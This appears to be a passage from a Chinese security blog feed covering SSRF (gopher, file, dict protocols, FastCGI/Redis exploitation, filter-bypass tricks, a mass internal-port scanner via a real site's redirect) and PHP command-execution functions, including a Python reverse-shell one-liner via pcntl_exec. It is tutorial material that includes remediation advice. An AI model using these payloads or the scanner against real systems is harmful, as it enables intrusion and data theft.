class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用通过命令发起的payload（一次url编码），发现无回显</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220805142401807.png" alt="image-20220805142401807"></p><p>再次进行url编码后发送，发现是可以回显的。</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.244</span>.<span class="number">128</span>%<span class="number">3</span>A80%<span class="number">2</span>F_POST%<span class="number">2520</span>%<span class="number">2</span>F1.php%<span class="number">2520</span>HTTP%<span class="number">2</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520192.168</span>.<span class="number">244.128</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">25206</span>%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Aa%<span class="number">253</span>Dkhaz%<span class="number">250</span>D%<span class="number">250</span>A</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20220805142614175.png" alt="image-20220805142614175"></p><h3 id="http-x2F-https"><a href="#http-x2F-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h3><p>探测Web 应用的信息情况</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>读取本地文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd    </span><br><span class="line">file:///etc/hosts     # 记录本机的或其他主机的ip及其对应主机名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">高权限</span></span><br><span class="line">file:///proc/net/arp  # 记录ARP协议内容，里面有主机的ip和mac地址</span><br><span class="line">file:///etc/network/interfaces # 大部分网络接口配置</span><br></pre></td></tr></table></figure><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>探测端口服务</p><p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p><blockquote><p>dict 协议是一个在线网络字典协议，用来架设字典服务的。</p><p>它是基于TCP协议开发的，所以像 mysql 的服务，因为也是基于 tcp 协议开发，所以用 dict 协议的方式打开能强行读取一些 mysql 服务的返回内容</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;dict://localhost:3306&quot;</span>; <span class="comment">//3306端口是mysql服务</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">PS D:\phpstudy_pro\phpstudy_pro\WWW\test&gt; D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.<span class="number">3.4</span>nts/php.exe <span class="string">&quot;d:\phpstudy_pro\phpstudy_pro\WWW\test\2.php&quot;</span></span><br><span class="line"></span><br><span class="line">J</span><br><span class="line"><span class="number">5.7</span>.<span class="number">26</span>U<span class="string">&#x27;+I2J%mkwB&quot;M)7     Imysql_native_password!#08S01Got packets out of order</span></span><br></pre></td></tr></table></figure><p>可以看到5.7.26和mysql</p><p><img src="/../images/image-20220804195027985.png" alt="image-20220804195027985"></p><p>​    </p><h2 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h2><h3 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list</a></p><p><a href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><ul><li>FPM是什么</li></ul><blockquote><p>当我们的web服务器收到请求php文件的请求时，就让php-fpm把其解释(翻译)成html格式的文件(事实上php-fpm正是干这个事的)，然后我们的web服务器将翻译出来的.html文件发给浏览器。</p><p>而php-fpm能够进行翻译依靠的就是Fastcgi通信协议。</p></blockquote><p><img src="/../images/1612761214_6020c87ec0101f355f51a.png!small" alt="1612761214_6020c87ec0101f355f51a.png!small"></p><ul><li><p>漏洞成因</p><blockquote><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>fastcgi协议传输的数据其实就是PHP环境变量的一部分。</p><p>通过设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p></blockquote></li><li><p>使用条件</p><blockquote><p>PHP服务器开启fastcgi的端口9000</p><p>能够找到PHP服务器上的php文件</p></blockquote></li><li><p>利用</p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><ul><li><p>监听端口：<code>nc -lvp 9000&gt;1.txt</code></p></li><li><p>使用exp：<code>python fpm.py -c &quot;payload&quot; -p 9000 127.0.0.1 php文件路径</code></p></li><li><p>将生成的1.txt进行双url编码：<code>python 1.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+s)</span><br></pre></td></tr></table></figure></li><li><p>利用得到的结果进行攻击</p><p><img src="/../images/image-20220805192301243.png" alt="image-20220805192301243"></p></li></ul></li></ul><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><ul><li>resp协议，换行分割&#x2F;x0a&#x2F;x0d</li><li>gopher协议可以构造数据包</li><li>weblogic的CRLF注入</li></ul><p><a href="https://www.cnblogs.com/sijidou/p/13681845.html">ssrf与gopher与redis - sijidou - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/qianxinggz/p/13405443.html">weblogic从ssrf到redis获取shell - qianxinggz - 博客园 (cnblogs.com)</a></p><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>[总结](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Request Forgery)</p><h2 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h2><p>python2脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests.packages.urllib3</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line">threads_count = <span class="number">20</span></span><br><span class="line">scheme = <span class="string">&#x27;dict&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">ip_block = <span class="string">&#x27;10.105&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WyWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,queue</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.queue.empty():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = self.queue.get_nowait()</span><br><span class="line">                content = requests.get(url, timeout=<span class="number">2.8</span>).content</span><br><span class="line">                <span class="built_in">print</span> url, <span class="string">&#x27;OPEN&#x27;</span>, <span class="built_in">len</span>(content)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):    </span><br><span class="line">        ip = <span class="string">&#x27;&#123;0&#125;.&#123;1&#125;.&#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(ip_block,c,d)</span><br><span class="line">        payload = <span class="string">&#x27;http://fuzz.wuyun.com/302.php?s=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            scheme=scheme,</span><br><span class="line">            ip=ip, </span><br><span class="line">            port=port</span><br><span class="line">            )</span><br><span class="line">        url = <span class="string">&quot;http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]&#123;payload&#125;[/img]&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            payload=payload)</span><br><span class="line">        queue.put(url)</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(threads_count):</span><br><span class="line">    threads.append(WyWorker(queue))</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>302.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数字ip地址"><a href="#数字ip地址" class="headerlink" title="数字ip地址"></a>数字ip地址</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>.<span class="variable">$r</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:0&quot;</span>.<span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:0x&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ip地址省略形式"><a href="#ip地址省略形式" class="headerlink" title="ip地址省略形式"></a>ip地址省略形式</h2><blockquote><p>可以省略ip地址中间的0</p><p>如127.1 &#x3D;&#x3D; 127.0.0.1</p></blockquote><p><img src="/../images/image-20230328171933107.png" alt="image-20230328171933107"></p><h2 id=""><a href="#" class="headerlink" title="@,#"></a>@,#</h2><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><p><a href="http://baidu.com@khaz.top/">http://baidu.com@khaz.top</a>  &#x3D;&gt;  <a href="http://khaz.top/">http://khaz.top</a></p><blockquote><p>只解析最后一个@后面的域名</p></blockquote><p><img src="/../images/image-20220504125707388.png" alt="image-20220504125707388"></p><p><a href="http://khaz.top/#baidu.com">http://khaz.top#baidu.com</a> &#x3D;&gt; <a href="http://khaz.top/">http://khaz.top</a></p><p><img src="/../images/image-20220504153148066.png" alt="image-20220504153148066"></p><h2 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h2><ul><li><p>知道创宇在线</p><p><a href="http://ceye.io/dns-rebinding">http://ceye.io/dns-rebinding</a></p><p><img src="/../images/image-20230319151337356.png" alt="image-20230319151337356"></p><p><img src="/../images/image-20230319151322924.png" alt="image-20230319151322924"></p></li><li><p>同一个域名绑定两条A记录。这样解析是随机的。 </p><p>自己的服务器：</p><p><img src="/../images/image-20220805221419076.png" alt="image-20220805221419076"></p><blockquote><p>需要多试几次，碰运气。</p><p>当服务器第一次解析出来是个外网ip，第二次解析出来是个内网ip的时候攻击就成功了</p></blockquote></li><li><p>自建</p><p><a href="https://xz.aliyun.com/t/7495#toc-6">https://xz.aliyun.com/t/7495#toc-6</a></p></li></ul><h2 id="本地地址不同形式"><a href="#本地地址不同形式" class="headerlink" title="本地地址不同形式"></a>本地地址不同形式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip：127.0.0.1 --&gt; 127。0。0。1</span><br><span class="line">域名：localhost</span><br><span class="line">ipv6：</span><br></pre></td></tr></table></figure><h2 id="url中的unicode欺骗"><a href="#url中的unicode欺骗" class="headerlink" title="url中的unicode欺骗"></a>url中的unicode欺骗</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h2 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h2><p><img src="/../images/image-20230603222133775.png" alt="image-20230603222133775"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li>禁止重定向跳转</li><li>设置URL白名单（限制可以访问的URL）</li><li>禁止不需要的协议</li><li>限制端口</li><li>鉴权，如cookie，jwt等，当攻击者只能控制一个url时，而无法添加这些请求头时，就无法访问某些接口</li><li>校验了其他http header字段时，如referer，UA等</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.wangan.com/articles/1238#59315b">https://www.wangan.com/articles/1238#59315b</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p><p><a href="https://joychou.org/web/phpssrf.html#directory0811578052187574410">https://joychou.org/web/phpssrf.html#directory0811578052187574410</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>应用程序有时需要调用一些执行系统命令的函数，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击。</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认无回显</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()和反引号</span><br><span class="line"><span class="title function_ invoke__">popen</span>()，<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认有回显</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( 命令，结果数组 ，状态码 )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># 默认无回显，要想获得结果，就要输出第二个参数</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># 命令执行成功的状态码为0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h2 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( 命令, 状态码 )</span><br></pre></td></tr></table></figure><p>实际上是执行了<code>sh -c &quot;command&quot;</code>命令</p><p><strong>system()函数</strong>执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( 命令, 状态码  )</span><br></pre></td></tr></table></figure><p>和<strong>system函数</strong>类似，执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="shell-exec-和-反引号"><a href="#shell-exec-和-反引号" class="headerlink" title="shell_exec()和 反引号"></a><strong>shell_exec()和 反引号</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( 命令 )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()函数</strong>默认无回显，通过 <strong>echo</strong> 可将执行结果输出到页面</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() 函数实际上仅是反撇号 () 操作符的变体，当禁用shell_exec时，&#96; 也不可执行</strong></p><p>反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>函数需要两个参数，一个是执行的命令**<code>command</code><strong>，另外一个是指针文件的连接模式</strong><code>mode</code>**，有<code>r</code>和<code>w</code>代表读和写。</p><p>函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h2><p>与<code>popen()</code>类似，只是可以开两个管道。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误 </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h2><p>前提条件：<strong>PHP安装并启用了pcntl插件</strong></p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。</p><p>pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p><p>利用pcntl_exec()执行test.sh：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/test.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;ip&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure><h1 id="无回显判断操作系统类型"><a href="#无回显判断操作系统类型" class="headerlink" title="无回显判断操作系统类型"></a>无回显判断操作系统类型</h1><ul><li><p>路径大小写敏感</p></li><li><p>nmap</p></li><li><p>外带命令执行结果</p></li><li><p>通过<code>ping</code>命令</p><blockquote><p>Windows下的Ping命令每间隔一秒会发送一个ICMP ECHO_REQUEST 包，因此可以利用 Ping 命令来近似地模拟等待指定秒数的效果</p></blockquote><figure class="highlight 